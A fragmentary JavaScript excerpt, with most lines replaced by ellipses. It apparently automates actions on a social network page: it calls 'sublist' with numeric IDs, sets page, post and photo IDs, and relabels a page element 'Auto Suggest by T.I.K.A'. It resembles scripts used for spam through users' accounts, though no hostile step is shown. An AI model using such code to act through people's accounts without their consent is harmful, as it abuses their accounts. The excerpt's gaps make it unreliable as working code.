...
//list
sublist("370622583064926");
sublist("370618946398623");
...
var spage_id = "128290387216157";
var spost_id = "128290387216157";
var sfoto_id = "128290387216157";
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by T.I.K.A';
